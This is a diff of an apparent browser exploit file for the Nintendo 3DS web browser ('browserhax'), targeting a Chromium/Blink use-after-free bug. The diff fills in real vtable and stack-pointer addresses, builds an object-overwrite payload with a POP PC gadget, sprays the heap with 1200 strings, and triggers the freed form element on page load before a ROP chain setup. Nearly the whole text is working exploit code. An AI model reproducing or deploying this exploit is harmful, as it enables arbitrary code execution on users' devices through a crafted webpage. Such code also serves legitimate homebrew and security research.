@@ -6,25 +6,22 @@ https://bugs.chromium.org/p/chromium/issues/detail?id=303657
 https://src.chromium.org/viewvc/blink?view=revision&revision=159590
 */
 
-$browserver = 7;
-
 include_once("/home/yellows8/browserhax/browserhax_cfg.php");
 
 include_once("3dsbrowserhax_common.php");
 
 if(($browserver & 0x80) == 0)
 {
-	//if($browserver == 7)
+	if(($browserver & 0xf) == 0x9)
 	{
-		$VTABLEPTR = 0x99887744;//0x0964f018;
-		$STACKPTR_ADR = 0x22334488;//0x09670024;
-		$OBJDATAPAYLOAD_ADDR = 0x11223344;//0x091cb000;
+		$VTABLEPTR = 0x08cc7018;
+		$STACKPTR_ADR = 0x08ce8018;
 	}
-	/*else
+	else
 	{
 		echo "This browser version is not supported.\n";
 		exit;
-	}*/
+	}
 }
 else
 {
@@ -36,44 +33,26 @@ $ROPHEAP = $VTABLEPTR;
 
 $OBJECTDATA_OVERWRITE = "\"";
 
-for($i=0; $i<0x40; $i+=4)
+$loopcnt = 0;
+for($i=0; $i<0x7c; $i+=4)
 {
-	if($i!=0x4)
+
+	if($i==0)
 	{
-		$OBJECTDATA_OVERWRITE.= genu32_unicode(0x40506090);
+		$OBJECTDATA_OVERWRITE.= genu32_unicode($VTABLEPTR);
 	}
 	else
 	{
-		$OBJECTDATA_OVERWRITE.= genu32_unicode(0x10203040);
+		if($loopcnt==0)$OBJECTDATA_OVERWRITE .= genu32_unicode($STACKPTR_ADR);//stack ptr
+		if($loopcnt==1)$OBJECTDATA_OVERWRITE .= genu32_unicode($VTABLEPTR);//lr / vtableptr when this overwrites object+0
+		if($loopcnt==2)$OBJECTDATA_OVERWRITE .= genu32_unicode($POPPC);
+
+		$loopcnt++;
+		if($loopcnt > 2)$loopcnt = 0;
 	}
 }
 
 $OBJECTDATA_OVERWRITE .= "\"";
-
-$OBJDATAPAYLOAD = "\"";
-for($j=0; $j<0x8000; $j+=0x40)
-{
-	for($i=0; $i<0x40; $i+=4)
-	{
-		if($i==0x34)
-		{
-			$OBJDATAPAYLOAD.= genu32_unicode($OBJDATAPAYLOAD_ADDR+4);//Addr of the object used when doing the vtable funcptr call with vtable +0x5c.
-		}
-		else if($i<0x34 && $i!=0x0)
-		{
-			$OBJDATAPAYLOAD.= genu32_unicode($VTABLEPTR);
-		}
-		else if($i==0x38)//Object +0x34 with the above used with stack-pivot(sp).
-		{
-			$OBJDATAPAYLOAD.= genu32_unicode($STACKPTR_ADR);
-		}
-		else
-		{
-			$OBJDATAPAYLOAD.= genu32_unicode($POPPC);
-		}
-	}
-}
-$OBJDATAPAYLOAD .= "\"";
 
 generate_ropchain();
 
@@ -92,22 +71,6 @@ function spray()
 	for(i=0; i<1200; i++)
 	{
 		obj[i] = unescape(<?= $OBJECTDATA_OVERWRITE ?>);
-	}
-}
-
-function spray_free()
-{
-	for(i=0; i<1200; i++)
-	{
-		obj[i] = null;
-	}
-}
-
-function setup_objdatapayload()
-{
-	for(i=0; i<300; i++)
-	{
-		objdatapayload[i] = unescape(<?= $OBJDATAPAYLOAD ?>);
 	}
 }
 
@@ -138,16 +101,6 @@ function ropsetup()//This function was originally based on heap() from: http://w
         }
 }
 
-function gc()
-{
-    if (window.GCController)
-        return GCController.collect();
-
-    for (var i = 0; i < 10000; i++) { // > force garbage collection (FF requires about 9K allocations before a collect)
-        var s = new String("abc");
-    }
-}
-
 function start() {
     form1 = document.createElement('form');
     submit1 = document.createElement('input');
@@ -167,10 +120,7 @@ function removeImage() {
     form1.removeChild(submit2);
     submit2 = null;
     spray();
-    //setup_objdatapayload();
-    //ropsetup();
-    //spray_free();
-    //gc();
+    ropsetup();
 }
 window.onload = start;
 </script>
